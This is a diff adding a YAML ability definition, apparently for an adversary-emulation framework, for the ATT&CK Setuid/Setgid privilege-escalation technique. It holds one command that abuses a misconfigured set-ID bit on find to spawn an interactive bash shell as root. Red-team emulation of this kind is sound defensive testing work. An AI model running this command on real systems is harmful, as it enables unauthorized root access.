@@ -1,0 +1,14 @@
+---
+
+- id: 02de522f-7e0a-4544-8afc-0c195f400f5f
+  name: Use of GID bit on find
+  description: Abuse a misconfigured GID to gain root access
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548
+    name: Setuid and SetGid
+  platforms:
+    linux:
+      sh:
+        command: |
+          find / -exec bash -i \;
